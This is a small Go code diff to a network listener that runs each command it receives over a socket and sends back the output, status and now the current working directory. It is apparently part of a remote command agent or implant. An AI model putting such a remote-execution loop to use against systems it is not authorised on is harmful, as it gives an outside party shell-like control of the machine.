@@ -6,6 +6,7 @@ import (
 	"net"
 	"time"
 	"strings"
+	"os"
 	"encoding/json"
 
 	"../commands"
@@ -39,9 +40,11 @@ func listen(conn net.Conn, profile map[string]interface{} , server string) {
     for scanner.Scan() {
         message := scanner.Text()
 		bites, status := commands.RunCommand(strings.TrimSpace(message), server)
+		pwd, _ := os.Getwd()
 		response := make(map[string]interface{})
 		response["response"] = string(bites)
 		response["status"] = status
+		response["pwd"] = pwd
 		jdata, _ := json.Marshal(response)
 		conn.Write(jdata)
     }
